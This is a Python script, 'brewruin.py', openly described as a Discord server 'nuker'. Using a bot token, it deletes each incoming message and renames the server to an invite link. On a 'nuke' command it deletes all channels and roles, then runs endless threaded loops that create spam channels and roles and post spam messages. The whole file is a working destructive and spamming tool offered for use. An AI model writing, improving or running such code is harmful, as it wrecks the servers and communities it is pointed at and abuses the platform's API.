"""
    @brewruin.py
*      a threaded, open-sourced discord nuker
*      probably best one out there, cause it's not pasted
*      fuck skids
    brewsoftworks.lol
"""
import os, sys, requests, json, random, asyncio, websockets, threading

''' Variables & Functions '''
Colors = {
    'RED': '\033[91m',
    'GREEN': '\033[92m',
    'YELLOW': '\033[93m',
    'BLUE': '\033[94m',
    'MAGENTA': '\033[95m',
    'CYAN': '\033[96m',
    'RESET': '\033[0m'
}

def clear():
    if sys.platform == "win32":
        os.system('cls')
    else:
        os.system('clear')
def load_config():
    with open(os.path.join(os.getcwd(), "bin", "config.json"), "r") as file:
        return json.load(file)
config = load_config()
def notify(txt, type):
    type = type or "ok"
    if type.lower() == "ok":
        print(f"{Colors['GREEN']}+ {Colors['RESET']}"+txt)
    elif type.lower() == "warn":
        print(f"{Colors['YELLOW']}! {Colors['RESET']}"+txt)
    elif type.lower() == "error":
        print(f"{Colors['RED']}- {Colors['RESET']}"+txt)
    else:
        print(f"{Colors['BLUE']}? {Colors['RESET']}"+txt)
AuthHeaders = {"Authorization": "Bot "+config["Token"]}

''' Init brewruin '''
clear()
async def brewruin():
    async def send_heartbeat(websocket):
        while True:
            await websocket.send(json.dumps({"op": 1, "d": None}))
            await asyncio.sleep(41.25)

    async with websockets.connect(config["Gateway"]) as websocket:
        asyncio.create_task(send_heartbeat(websocket))
        payload = {
            'op': 2,
            'd': {
                'token': config['Token'],
                'intents': 513,
                'properties': {
                    '$os': 'linux',
                    '$browser': 'my_library',
                    '$device': 'my_library'}}
        }
        await websocket.send(json.dumps(payload))

        while True:
            try:
                response = await websocket.recv()
                data = json.loads(response)
                event = data.get('t')
                if payload['op'] == 9:
                    os.system("py "+os.getcwd()+'/bin/src.py')
            except:
                os.system("py "+os.getcwd()+'/bin/src.py')

            ### Handle Websocket Response ###
            if event == 'READY':
                notify("BrewRuin Ready", 'ok')
            elif event == "MESSAGE_CREATE":
                message = data.get('d')
                author = message["author"]
                content = message["content"]
                messageid = message["id"]
                channelid = message["channel_id"]
                guildid = message['guild_id']
                
                try:
                    requests.delete(f"https://discord.com/api/v9/channels/{channelid}/messages/{messageid}", headers=AuthHeaders)
                    requests.patch("https://discord.com/api/v9/guilds/"+guildid, json={'name': ".gg/xEYF2eEcf"}, headers=AuthHeaders)
                    notify("Set guild name.", 'ok')
                except Exception as e:
                    notify("Could not set guild name.\n"+e, 'error')

                if content.lower() == config["Prefix"]+'nuke':
                    channels=requests.get(f'https://discord.com/api/v10/guilds/{guildid}/channels', headers=AuthHeaders).json()
                    roles=requests.get(f'https://discord.com/api/v10/guilds/{guildid}/roles', headers=AuthHeaders).json()

                    ''' Define Nuking Functions '''
                    def removeChannels():
                        for channel in channels:
                            try:
                                savedata = channel
                                requests.delete("https://discord.com/api/v9/channels/"+channel['id'], headers=AuthHeaders)
                                notify("Deleted "+savedata['name'], 'ok')
                            except Exception as e:
                                notify(f"Could not delete {channel['name']}\n"+e, 'error')
                    def removeRoles():
                        for role in roles:
                            try:
                                savedata = role
                                requests.delete(f"https://discord.com/api/v9/guilds/{guildid}/roles/"+role['id'], headers=AuthHeaders)
                                notify("Deleted "+savedata['name'], 'ok')
                            except Exception as e:
                                notify(f"Could not delete {role['name']}\n"+e, 'error')
                    def createRoles():
                        while True:
                            create = requests.post(f"https://discord.com/api/v9/guilds/{guildid}/roles", json={"name": random.choice(config["Quotes"])}, headers=AuthHeaders)
                            if create.status_code == 200 or create.status_code == 203 or create.status_code == 201:
                                notify("Role created '"+create.json()['name']+"'", 'ok')
                            else:
                                notify("Could not create role.", 'error')
                    def createChannels():
                        while True:
                            create = requests.post(f"https://discord.com/api/v9/guilds/{guildid}/channels", json={"name": random.choice(config["Quotes"])}, headers=AuthHeaders)
                            if create.status_code == 200 or create.status_code == 203 or create.status_code == 201:
                                notify("Channel created '"+create.json()['name']+"'", 'ok')
                            else:
                                notify("Could not create channel.", 'error')
                    def webhookSpam():
                        create = requests.post(f"https://discord.com/api/v9/guilds/{guildid}/channels", json={"name": "joinbrew"}, headers=AuthHeaders)
                        if create.status_code == 200 or create.status_code == 203 or create.status_code == 201:
                            notify("Channel created '"+create.json()['name']+"'", 'ok')
                        else:
                            notify("Could not create channel.", 'error')
                        while True:
                            requests.post(f"https://discord.com/api/v9/channels/{create.json()['id']}/webhooks", headers=AuthHeaders, json={"name": "brewsoftworks.lol"}).json()
                            requests.post(f"https://discord.com/api/v10/channels/{create.json()['id']}/messages", json={"content": random.choice(config["Chats"])}, headers=AuthHeaders)
                            for webhook in requests.get(f"https://discord.com/api/v9/channels/{create.json()['id']}/webhooks"):
                                pass # i'm not gonna finish this

                    ''' Thread Nuking Functions '''
                    threading.Thread(target=removeChannels).start()
                    threading.Thread(target=removeRoles).start()
                    threading.Thread(target=createChannels).start()
                    threading.Thread(target=createRoles).start()
                    threading.Thread(target=webhookSpam).start()

                    ''' Looping '''
                    pass # hi

asyncio.run(brewruin())